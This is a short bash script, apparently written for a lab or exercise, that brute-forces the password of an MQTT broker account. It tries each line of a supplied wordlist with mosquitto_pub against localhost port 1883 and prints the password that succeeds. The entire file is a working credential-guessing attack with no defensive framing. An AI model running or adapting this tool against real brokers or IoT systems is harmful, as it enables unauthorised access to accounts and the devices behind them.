#!/bin/bash

filepath=$1
topic=$2
username=$3
password_found=0

while read -r line
do
    sudo mosquitto_pub -h localhost -p 1883 -t "$topic" -m "hello manvith" -u "$username" -P "$line" &> /dev/null
    exit_code=$?

    if [ $exit_code -eq 0 ]; then
        echo "Password for $username is $line"
        password_found=1
        break
    else
        echo "$line: Wrong password"
    fi
done < "$filepath"

if [ $password_found -eq 0 ]; then
    echo "Password not found"
fi
